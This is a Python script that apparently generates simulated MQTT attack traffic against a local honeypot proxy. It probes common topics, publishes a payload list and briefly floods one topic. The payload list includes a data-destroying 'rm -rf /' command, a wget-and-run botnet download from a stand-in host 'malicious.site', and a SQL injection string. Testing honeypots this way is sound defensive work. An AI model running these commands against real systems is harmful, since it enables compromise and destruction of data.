import paho.mqtt.client as mqtt
import time
import random
import json
import sys

# Target the honeypot proxy port
BROKER = "localhost"
PORT = 1884

# Common topics attackers scan for
TOPICS = [
    "admin/settings",
    "system/control",
    "device/config",
    "home/security",
    "factory/plc/1",
    "sensors/critical",
    "firmware/update"
]

# Malicious payloads
PAYLOADS = [
    {"cmd": "rm -rf /", "user": "root"},
    {"exploit": "CVE-2023-1234", "payload": "buffer_overflow_string_AAAAAAAAAAAAAAAA"},
    {"command": "wget http://malicious.site/botnet.sh -O /tmp/bot; sh /tmp/bot"},
    {"sql_injection": "' OR '1'='1"},
    {"admin_override": True, "access_level": 0},
    {"shutdown": "now", "force": True}
]

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[*] Attacker connected to {BROKER}:{PORT}")
    else:
        print(f"[!] Connection failed with code {rc}")

def simulate_attack():
    client_id = f"attacker-{random.randint(1000, 9999)}"
    client = mqtt.Client(client_id=client_id)
    client.on_connect = on_connect
    
    try:
        print(f"[*] Starting attack simulation from {client_id}...")
        client.connect(BROKER, PORT, 60)
        client.loop_start()
        time.sleep(1)
        
        # 1. Reconnaissance (Scanning topics)
        print("[*] Phase 1: Reconnaissance - Probing topics...")
        for topic in TOPICS:
            print(f"  -> Probing {topic}")
            client.publish(topic, "null", retain=False)
            time.sleep(0.5)
            
        # 2. Exploitation (Sending malicious payloads)
        print("[*] Phase 2: Exploitation - Sending malicious payloads...")
        for i in range(5):
            topic = random.choice(TOPICS)
            payload = random.choice(PAYLOADS)
            print(f"  -> attacking {topic} with {json.dumps(payload)}")
            client.publish(topic, json.dumps(payload))
            time.sleep(1)
            
        # 3. Flooding (Rapid fire)
        print("[*] Phase 3: DoS Attempt - Rapid fire...")
        for i in range(10):
            topic = "system/overload"
            client.publish(topic, f"flood_packet_{i}")
            time.sleep(0.1)
            
        print("[*] Attack simulation complete.")
        client.loop_stop()
        client.disconnect()
        
    except Exception as e:
        print(f"[!] Attack failed: {e}")

if __name__ == "__main__":
    simulate_attack()
